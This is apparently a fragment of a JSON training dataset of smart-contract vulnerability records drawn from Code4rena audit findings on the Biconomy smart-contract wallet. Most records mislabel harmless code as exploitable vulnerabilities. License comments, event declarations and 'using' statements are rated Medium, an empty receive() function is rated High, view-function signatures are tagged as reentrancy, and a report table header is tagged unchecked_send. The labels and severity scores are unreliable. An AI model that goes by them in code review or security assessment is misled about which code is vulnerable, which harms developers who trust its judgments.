    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::112 => owner = _newOwner; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::172 => owner = _owner; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::19 => _defaultImpl = _baseImpl; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::112 => owner = _newOwner; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::172 => owner = _owner;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.51,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::166 => function init(address _owner, address _entryPointAddress, address _handler) public override initializer {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::166 => function init(address _owner, address _entryPointAddress, address _handler) public override initializer {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::166 => function init(address _owner, address _entryPointAddress, address _handler) public override initializer { 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::166 => function init(address _owner, address _entryPointAddress, address _handler) public override initializer {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.377,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/Proxy.sol::36 => receive() external payable {}\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::550 => receive() external payable {}\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::540 => receive() external payable {}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/Proxy.sol::36 => receive() external payable {} 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::550 => receive() external payable {} 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::540 => receive() external payable {}",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.326,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::102 => return _entryPoint;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::146 => return id;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::102 => return _entryPoint;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::146 => return id;\n2023-01-biconomy-main/contracts/smart-contract-wallet/libs/Strings.sol::36 => return buffer;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::102 => return _entryPoint; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::146 => return id; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::102 => return _entryPoint; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::146 => return id; 2023-01-biconomy-main/contracts/smart-contract-wallet/libs/Strings.sol::36 => return buffer;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.484,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/Proxy.sol::31 => case 0 {revert(0, returndatasize())}\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::294 => revert(string(abi.encodePacked(requiredGas)));\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::371 => require(execute(to, value, data, operation, gasleft()));\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::374 => revert(string(abi.encodePacked(requiredGas)));\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::481 => revert(add(result, 32), mload(result))\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::528 => require(req);\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::471 => revert(add(result, 32), mload(result))\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::518 => require(req);\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/FallbackManager.sol::48 => revert(0, returndatasize())\n2023-01-biconomy-main/contracts/smart-contract-wallet/libs/MultiSend.sol::59 => revert(0, 0)\n2023-01-biconomy-main/contracts/smart-contract-wallet/libs/MultiSendCallOnly.sol::51 => revert(0, 0)\n2023-01-biconomy-main/contracts/smart-contract-wallet/libs/MultiSendCallOnly.sol::54 => revert(0, 0)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/Proxy.sol::31 => case 0 {revert(0, returndatasize())} 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::294 => revert(string(abi.encodePacked(requiredGas))); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::371 => require(execute(to, value, data, operation, gasleft())); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::374 => revert(string(abi.encodePacked(requiredGas))); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::481 => revert(add(result, 32), mload(result))",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::42 => bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::224 => require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::322 => require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::42 => bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::48 => bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xeedfef42e81fe8cd0e4185e4320e9f8d52fd97eb890b85fa9bd7ad97c9a18de2;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::224 => require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::317 => require(uint256(s) >= uint256(1) * 65, \"BSA021\");\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/FallbackManager.sol::12 => bytes32 internal constant FALLBACK_HANDLER_STORAGE_SLOT = 0x6c9a6c4a39284e37ed1cf53d337577d14212a4870fb976a4366c693b939918d5;\n2023-01-biconomy-main/contracts/smart-contract-wallet/common/SecuredTokenTransfer.sol::22 => let success := call(sub(gas(), 10000), token, 0, add(data, 0x20), mload(data), 0, 0x20)\n2023-01-biconomy-main/contracts/smart-contract-wallet/common/Singleton.sol::9 => /* This is the keccak-256 hash of \"biconomy.scw.proxy.implementation\" subtracted by 1 */\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::42 => bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::224 => require(gasleft() >= max((_tx.targetTxGas * 64) / 63,_tx.targetTxGas + 2500) + 500, \"BSA010\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::322 => require(uint256(s) >= uint256(1) * 65, \"BSA021\"); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::42 => bytes32 internal constant DOMAIN_SEPARATOR_TYPEHASH = 0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/BaseSmartAccount.sol::34 => using UserOperationLib for UserOperation;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::30 => using ECDSA for bytes32;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::31 => using LibAddress for address;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::30 => using ECDSA for bytes32;\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::31 => using LibAddress for address;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/BaseSmartAccount.sol::34 => using UserOperationLib for UserOperation; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::30 => using ECDSA for bytes32; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::31 => using LibAddress for address; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::30 => using ECDSA for bytes32; 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::31 => using LibAddress for address;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.559,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::144 => id := chainid()\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::144 => id := chainid()\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::144 => id := chainid() 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::144 => id := chainid()",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.197,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/Proxy.sol::13 => event Received(uint indexed value, address indexed sender, bytes data);\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::64 => event ImplementationUpdated(address _scw, string version, address newImplementation);\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::65 => event EntryPointChanged(address oldEntryPoint, address newEntryPoint);\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::67 => event WalletHandlePayment(bytes32 txHash, uint256 payment);\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::64 => event ImplementationUpdated(address _scw, string version, address newImplementation);\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::65 => event EntryPointChanged(address oldEntryPoint, address newEntryPoint);\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::67 => event WalletHandlePayment(bytes32 txHash, uint256 payment);\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/Executor.sol::9 => event ExecutionFailure(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas);\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/Executor.sol::10 => event ExecutionSuccess(address to, uint256 value, bytes data, Enum.Operation operation, uint256 txGas);\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/Proxy.sol::13 => event Received(uint indexed value, address indexed sender, bytes data); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::64 => event ImplementationUpdated(address _scw, string version, address newImplementation); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::65 => event EntryPointChanged(address oldEntryPoint, address newEntryPoint); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::67 => event WalletHandlePayment(bytes32 txHash, uint256 payment); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::64 => event ImplementationUpdated(address _scw, string version, address newImplementation);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/Proxy.sol::1 => // SPDX-License-Identifier: MIT\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::1 => // SPDX-License-Identifier: MIT\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::1 => // SPDX-License-Identifier: MIT\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::1 => // SPDX-License-Identifier: MIT\n2023-01-biconomy-main/contracts/smart-contract-wallet/libs/Strings.sol::1 => // SPDX-License-Identifier: MIT\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/Proxy.sol::1 => // SPDX-License-Identifier: MIT 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::1 => // SPDX-License-Identifier: MIT 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::1 => // SPDX-License-Identifier: MIT 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::1 => // SPDX-License-Identifier: MIT 2023-01-biconomy-main/contracts/smart-contract-wallet/libs/Strings.sol::1 => // SPDX-License-Identifier: MIT",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.552,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/BaseSmartAccount.sol::41 => function nonce() public view virtual returns (uint256);\n2023-01-biconomy-main/contracts/smart-contract-wallet/BaseSmartAccount.sol::47 => function nonce(uint256 _batchId) public view virtual returns (uint256);\n2023-01-biconomy-main/contracts/smart-contract-wallet/BaseSmartAccount.sol::53 => function entryPoint() public view virtual returns (IEntryPoint);\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::93 => function nonce() public view virtual override returns (uint256) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::97 => function nonce(uint256 _batchId) public view virtual override returns (uint256) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::101 => function entryPoint() public view virtual override returns (IEntryPoint) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::135 => function domainSeparator() public view returns (bytes32) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::140 => function getChainId() public view returns (uint256) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::166 => function init(address _owner, address _entryPointAddress, address _handler) public override initializer {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::197 => ) public payable virtual override returns (bool success) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::306 => ) public view virtual {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::401 => ) public view returns (bytes32) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::428 => ) public view returns (bytes memory) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::518 => function getDeposit() public view returns (uint256) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::525 => function addDeposit() public payable {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::536 => function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::33 => function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountFactory.sol::53 => function deployWallet(address _owner, address _entryPoint, address _handler) public returns(address proxy){\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::93 => function nonce() public view virtual override returns (uint256) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::97 => function nonce(uint256 _batchId) public view virtual override returns (uint256) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::101 => function entryPoint() public view virtual override returns (IEntryPoint) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::135 => function domainSeparator() public view returns (bytes32) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::140 => function getChainId() public view returns (uint256) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::166 => function init(address _owner, address _entryPointAddress, address _handler) public override initializer {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::197 => ) public payable virtual override returns (bool success) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::254 => ) public nonReentrant returns (uint256 payment) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::301 => ) public view virtual {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::391 => ) public view returns (bytes32) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::418 => ) public view returns (bytes memory) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::508 => function getDeposit() public view returns (uint256) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::515 => function addDeposit() public payable {\n2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccountNoAuth.sol::526 => function withdrawDepositTo(address payable withdrawAddress, uint256 amount) public onlyOwner {\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/FallbackManager.sol::26 => function setFallbackHandler(address handler) public authorized {\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::32 => function enableModule(address module) public authorized {\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::47 => function disableModule(address prevModule, address module) public authorized {\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::66 => ) public virtual returns (bool success) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::85 => ) public returns (bool success, bytes memory returnData) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/base/ModuleManager.sol::105 => function isModuleEnabled(address module) public view returns (bool) {\n2023-01-biconomy-main/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol::19 => function isValidSignature(bytes memory _data, bytes memory _signature) public view virtual returns (bytes4);\n2023-01-biconomy-main/contracts/smart-contract-wallet/libs/MultiSend.sol::26 => function multiSend(bytes memory transactions) public payable {\n2023-01-biconomy-main/contracts/smart-contract-wallet/libs/MultiSendCallOnly.sol::21 => function multiSend(bytes memory transactions) public payable {\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/BaseSmartAccount.sol::41 => function nonce() public view virtual returns (uint256); 2023-01-biconomy-main/contracts/smart-contract-wallet/BaseSmartAccount.sol::47 => function nonce(uint256 _batchId) public view virtual returns (uint256); 2023-01-biconomy-main/contracts/smart-contract-wallet/BaseSmartAccount.sol::53 => function entryPoint() public view virtual returns (IEntryPoint); 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::93 => function nonce() public view virtual override returns (uint256) { 2023-01-biconomy-main/contracts/smart-contract-wallet/SmartAccount.sol::97 => function nonce(uint256 _batchId) public view virtual override returns (uint256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 43,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n2023-01-biconomy-main/contracts/smart-contract-wallet/common/SignatureDecoder.sol::31 => // use the second best option, 'and'\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "2023-01-biconomy-main/contracts/smart-contract-wallet/common/SignatureDecoder.sol::31 => // use the second best option, 'and'",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.127,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n      It's not necessary because the initializer modifier already prevents the function from being reinitialized.\n\n\n       https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L168\n\n\n3.  Remove the check\n     ",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "1.    Remove the check",
    "description": "require (owner == address(0), \"Already Initialized\"); It's not necessary because the initializer modifier already prevents the function from being reinitialized. https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract- wallet/SmartAccount.sol#L167 2.   Remove the check require(address(_entryPoint) == address(0), \"Already initialized\");",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.313,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "| 1 |\n| [N-17] |Use underscores for number literals| 2 |\n| [N-18] |",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Non-Critical Issues List",
    "description": "| Number |Issues Details|Context| |:--:|:-------|:--:| | [N-01]|Insufficient coverage|1| | [N-02] |Unused function parameter and local variable |2| | [N-03] |Initial value check is missing in Set Functions| 3 |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.067,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  246  \n  247:     function handlePayment(\n  248:         uint256 gasUsed,\n  249:         uint256 baseGas,\n  250:         uint256 gasPrice,\n  251:         uint256 tokenGasPriceFactor,\n  252:         address gasToken,\n  253:         address payable refundReceiver\n  254:     ) private nonReentrant returns (uint256 payment) {\n  255:         // uint256 startGas = gasleft();\n  256:         // solhint-disable-next-line avoid-tx-origin\n  257:         address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n  258:         if (gasToken == address(0)) {\n  259:             // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n  260:             payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n  261:             (bool success,) = receiver.call{value: payment}(\"\");\n  262:             require(success, \"BSA011\");\n  263:         } else {\n  264:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n  265:             require(transferToken(gasToken, receiver, payment), \"BSA012\");\n  266:         }\n  267:         // uint256 requiredGas = startGas - gasleft();\n  268:         //console.log(\"hp %s\", requiredGas);\n  269:     }\n  270: \n  271:     function handlePaymentRevert(\n  272:         uint256 gasUsed,\n  273:         uint256 baseGas,\n  274:         uint256 gasPrice,\n  275:         uint256 tokenGasPriceFactor,\n  276:         address gasToken,\n  277:         address payable refundReceiver\n  278:     ) external returns (uint256 payment) {\n  279:         uint256 startGas = gasleft();\n  280:         // solhint-disable-next-line avoid-tx-origin\n  281:         address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;\n  282:         if (gasToken == address(0)) {\n  283:             // For ETH we will only adjust the gas price to not be higher than the actual used gas price\n  284:             payment = (gasUsed + baseGas) * (gasPrice < tx.gasprice ? gasPrice : tx.gasprice);\n  285:             (bool success,) = receiver.call{value: payment}(\"\");\n  286:             require(success, \"BSA011\");\n  287:         } else {\n  288:             payment = (gasUsed + baseGas) * (gasPrice) / (tokenGasPriceFactor);\n  289:             require(transferToken(gasToken, receiver, payment), \"BSA012\");\n  290:         }\n  291:         uint256 requiredGas = startGas - gasleft();\n  292:         //console.log(\"hpr %s\", requiredGas);\n  293:         // Convert response to string and return via error message\n  294:         revert(string(abi.encodePacked(requiredGas)));\n  295:     }\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[L-01] Prevent division by 0",
    "description": "On several locations in the code precautions are not being taken for not dividing by 0, this will revert the code. These functions can be calledd with 0 value in the input, this value is not checked for being bigger than 0, that means in some scenarios this can potentially trigger a division by zero. [SmartAccount.sol#L247-L295](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L247-L295) 2 results - 1 file contracts/smart-contract-wallet/SmartAccount.sol:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 54,
    "has_external_calls": true,
    "has_state_changes": true,
